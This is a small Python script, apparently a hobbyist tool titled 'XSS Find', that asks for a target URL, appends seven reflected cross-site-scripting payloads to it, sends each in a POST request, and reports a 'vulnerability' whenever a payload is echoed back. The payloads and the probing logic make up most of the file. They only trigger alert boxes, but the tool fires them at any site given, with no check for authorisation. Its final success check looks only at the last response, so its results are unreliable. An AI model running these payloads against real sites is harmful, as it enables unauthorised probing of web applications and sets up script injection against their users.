import os, requests, time
from colorama import Fore
os.system("apt install figlet")
os.system("clear")
print(Fore.CYAN + """
   _  __              _______           __
  | |/ /__________   / ____(_)___  ____/ /
  |   // ___/ ___/  / /_  / / __ \/ __  / 
 /   |(__  |__  )  / __/ / / / / / /_/ /  
/_/|_/____/____/  /_/   /_/_/ /_/\__,_/
""")
print(Fore.RED + "Web URL XSS test script\n")
print(Fore.BLUE + "Author = Saep\n")
print(Fore.GREEN + "Version 0.1\n")

payload1 = "<script>alert(:D)</script>"
payload2 = """<ScRipT>alert("XSS");</ScRipT>"""
payload3 = """<img src=xss onerror=alert(1)>"""
payload4 = """<script ~~~>alert(0%0)</script ~~~>"""
payload5 = """<body/onload=&lt;!--&gt;&#10alert(1)>>"""
payload6 = """<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?"""
payload7 = """</script><script>alert(1)</script>"""

url = input("Target Url: ")
req = requests.post(url + payload1)
if payload1 in req.text:
	print(Fore.GREEN + "\nXSS Vulnerability Founded!")
	print(Fore.GREEN + "\nPayload: <script>alert(:D)</script>\n\n")

req = requests.post(url + payload2)
if payload2 in req.text:	
	print(Fore.GREEN + "\nXSS Vulnerability Founded!")
	print(Fore.GREEN + """\nPayload: <ScRipT>alert("XSS");</ScRipT>\n\n""")

req = requests.post(url + payload3)
if payload3 in req.text:	
	print(Fore.GREEN + "\nXSS Vulnerability Founded!")
	print(Fore.GREEN + """\nPayload: <img src=xss onerror=alert(1)>\n\n""")
req = requests.post(url + payload4)
if payload4 in req.text:	
	print(Fore.GREEN + "\nXSS Vulnerability Founded!")
	print(Fore.GREEN + """\nPayload: <script ~~~>alert(0%0)</script ~~~>\n\n""")
req = requests.post(url + payload5)
if payload5 in req.text:	
	print(Fore.GREEN + "\nXSS Vulnerability Founded!")
	print(Fore.GREEN + """\nPayload: <body/onload=&lt;!--&gt;&#10alert(1)>>\n\n""")
req = requests.post(url + payload6)
if payload6 in req.text:	
	print(Fore.GREEN + "\nXSS Vulnerability Founded!")
	print(Fore.GREEN + """\nPayload: <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?\n\n""")
req = requests.post(url + payload7)
if payload7 in req.text:	
	print(Fore.GREEN + "\nXSS Vulnerability Founded!")
	print(Fore.GREEN + """\nPayload: </script><script>alert(1)</script>\n\n""")


if not payload1 in req.text and not payload2 in req.text and not payload3 in req.text and not payload4 in req.text and not payload5 in req.text and not payload6 in req.text and not payload7 in req.text:
	print(Fore.RED +"\n\nPayloads Unsuccessful!\n")
